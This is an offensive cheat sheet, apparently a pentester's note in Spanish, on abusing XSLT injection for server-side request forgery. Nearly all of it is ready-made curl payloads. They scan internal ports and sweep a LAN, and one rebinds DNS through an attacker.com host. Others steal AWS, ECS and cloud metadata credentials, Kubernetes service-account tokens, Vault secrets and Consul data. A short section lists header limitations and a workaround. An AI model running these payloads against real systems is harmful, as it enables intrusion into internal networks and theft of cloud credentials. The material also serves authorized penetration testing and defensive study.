---
aliases:
  - XSLT SSRF
  - XSLT document HTTP
tags:
  - type/technique
  - vuln/xslt-injection
  - vuln/ssrf
  - technique/discovery
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# XSLT - SSRF

***

## Escaneo de Puertos Internos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:22/&apos;)"/>' https://target/transform` | SSH banner localhost | SSH probe. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:6379/info&apos;)"/>' https://target/transform` | Redis INFO sin auth | Redis no-auth. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:9200/_cluster/state&apos;)"/>' https://target/transform` | ElasticSearch cluster state | ES no-auth. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:8080/admin&apos;)"/>' https://target/transform` | Tomcat/Spring admin panel | Internal admin. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:27017/&apos;)"/>' https://target/transform` | MongoDB HTTP interface | Mongo HTTP. |
| `curl -X POST --data '<xsl:choose><xsl:when test="document(&apos;http://127.0.0.1:8080/&apos;)">OPEN</xsl:when><xsl:otherwise>CLOSED</xsl:otherwise></xsl:choose>' https://target/transform` | Boolean port open detect | Boolean oracle. |
| `curl -X POST --data '<xsl:for-each select="(80,443,8080,8443,3000,5000,9090)"><xsl:variable name="p" select="."/><xsl:if test="document(concat(&apos;http://127.0.0.1:&apos;, $p, &apos;/&apos;))"><port><xsl:value-of select="$p"/></port></xsl:if></xsl:for-each>' https://target/transform` | Loop port scan common ports | Iterator scan. |
| `curl -X POST --data '<xsl:for-each select="1 to 254"><xsl:variable name="ip" select="concat(&apos;10.0.0.&apos;, .)"/><xsl:if test="document(concat(&apos;http://&apos;, $ip, &apos;:22/&apos;))"><host><xsl:value-of select="$ip"/></host></xsl:if></xsl:for-each>' https://target/transform` | LAN /24 sweep SSH check | LAN sweep. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://target.attacker.com/&apos;)"/>' https://target/transform` (rebind DNS) | DNS rebind dynamic IP | DNS rebind. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://0.0.0.0:6379/&apos;)"/>' https://target/transform` | 0.0.0.0 = localhost alt | Localhost alt. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://[::1]:6379/&apos;)"/>' https://target/transform` | IPv6 loopback | IPv6 alt. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://localhost:8500/v1/kv/&apos;)"/>' https://target/transform` | localhost hostname alt | Hostname alt. |
| `for p in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do echo "[$p]"; curl -sX POST --data "<xsl:copy-of select=\"document('http://127.0.0.1:$p/')\"/>" https://target/transform \| head -1; done` | Bulk port scan loop | Bulk loop. |
^xslt-ssrf-portscan

___

## Cloud Metadata e Internos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.169.254/latest/meta-data/iam/security-credentials/&apos;)"/>' https://target/transform` | AWS IAM role list | AWS IMDSv1. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME&apos;)"/>' https://target/transform` | AWS role temporary credentials | AWS keys. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.169.254/latest/meta-data/&apos;)"/>' https://target/transform` | AWS full metadata tree | AWS recon. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.169.254/latest/user-data/&apos;)"/>' https://target/transform` | AWS userdata cloud-init scripts | AWS userdata leak. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.169.254/metadata/v1/&apos;)"/>' https://target/transform` | DigitalOcean metadata sin headers | DigitalOcean. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://100.100.100.200/latest/meta-data/&apos;)"/>' https://target/transform` | Alibaba Cloud metadata | Alibaba. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///var/run/secrets/kubernetes.io/serviceaccount/token&apos;)"/>' https://target/transform` | Kubernetes SA token (filesystem read) | Kube SA. |
| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt&apos;)"/>' https://target/transform` | Kubernetes CA cert | Kube CA. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;https://kubernetes.default.svc/api/v1/namespaces/default/pods&apos;)"/>' https://target/transform` (requires token via header — limitation) | Kube API list pods (no headers) | Limited. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:8500/v1/kv/?recurse&apos;)"/>' https://target/transform` | Consul KV store full enum | Consul agent. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:8200/v1/secret/data/app&apos;)"/>' https://target/transform` | Vault unsealed read sin policies | Vault unsealed. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&apos;)"/>' https://target/transform` (GCP — needs header — fail without) | GCP token attempt (will fail no header) | GCP limited. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://169.254.170.2/v2/credentials/&apos;)"/>' https://target/transform` | ECS task creds | ECS task. |
| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://127.0.0.1:5000/v2/_catalog&apos;)"/>' https://target/transform` | Docker registry catalog | Registry. |
^xslt-ssrf-cloud

### Limitación de headers

XSLT `document()` y `unparsed-text()` **no permiten setear headers HTTP custom**. Esto bloquea:
- Azure / GCP metadata (requieren `Metadata: true` / `Metadata-Flavor: Google`).
- AWS IMDSv2 (requiere token con `X-aws-ec2-metadata-token`).
- APIs internas con `Authorization: Bearer ...`.

Workaround: leer credenciales/tokens desde filesystem (kube SA token, instance role files) y usarlos via OOB chain o reportar como findings.

***
